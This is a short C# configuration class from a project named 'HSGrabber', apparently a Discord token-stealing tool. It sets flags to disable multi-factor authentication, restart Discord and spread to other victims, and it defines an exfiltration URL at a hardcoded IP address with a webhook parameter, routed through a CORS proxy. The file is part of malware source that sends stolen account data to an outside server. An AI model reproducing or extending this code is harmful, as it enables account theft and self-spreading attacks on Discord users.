using System;

namespace HSGrabber
{
	internal class Settings
	{
		public static bool disableMfa = false;

		public static bool restartDiscord = true;

		public static bool spread = true;

		private static string serverurl = "http://62.210.119.165/api/v1/send?webhook=yourwebhook";

		public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl;
	}
}
